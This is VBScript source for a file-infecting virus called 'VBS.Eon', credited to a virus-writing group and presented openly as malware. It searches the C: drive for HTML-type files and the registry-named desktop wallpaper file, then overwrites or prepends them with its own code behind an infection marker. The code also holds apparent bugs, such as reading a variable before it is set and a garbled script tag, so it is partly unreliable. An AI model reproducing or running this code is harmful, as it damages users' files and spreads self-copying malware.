' VBS.Eon
' Coded by Ruzz`
' The Shadow Virus Group
' http://www.shadowvx.org/
'
' Begin code
On Error Resume Next 

Set fso = CreateObject("Scripting.FileSystemObject")
Set wordobj = CreateObject("Word.application")
Set reg = CreateObject("WScript.Shell")
parent = Wscript.ScriptFullName
Set srch = wordobj.Application.FileSearch 

Const ForReading = 1, ForWriting = 2, ForAppending = 8
Const TristateUseDefault = -2, TristateTrue = -1, TristateFalse = 0 

srch.NewSearch
srch.LookIn = "c:\"
srch.SearchSubFolders = True
srch.FileName = "*.ht*"
srch.Execute 

Set openme = fso.opentextfile(parent, 1)
openmeread = openme.readall
openme.close 

For count = 1 To srch.FoundFiles.Count
  Set opencount = fso.opentextfile(srch.FoundFiles(count),2)
  Set openhtt = fso.opentextfile(RegActive,1)
  read1stline = openhtt.readline
  If read1stline = "<!-- Phybre -->" Then
    openhtt.close
  Else
    oldhtt = openhtt.readall
    openhtt.close
    set openhttr = fso.opentextfile(srch.FoundFiles(count),2)
    openhttr.write "<!-- Phybre -->" & vbcrlf
    openhttr.write "<Script language = VBScript7gt;" & vbcrlf
    openhttr.write (openmeread) & vbcrlf
    openhttr.write "<" & Chr(47) & "Script>"
    openhttr.write (openmeread)
    openhttr.close
  End If
Next 

WORDOBJ.Quit 

RegActive = reg.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General\Wallpaper")

If RegActive <> "" Then
  Set openad = fso.opentextfile(RegActive,1)
  read1stline = openad.readline
  If read1stline = "<!-- Phybre -->" Then
    openad.close
  Else
    oldread = openad.readall
    openad.close
    set opened = fso.opentextfile(RegActive,2)
    opened.write "<!-- Phybre -->" & vbcrlf & "" & vbcrlf
    opened.write "<Script language = VBScript>" & vbcrlf
    opened.write (openmeread) & vbcrlf
    opened.write "<" & Chr(47) & "Script>"
    opened.writeblanklines (1)
    opened.write oldread
    opened.close
  End If
End If

'End Code 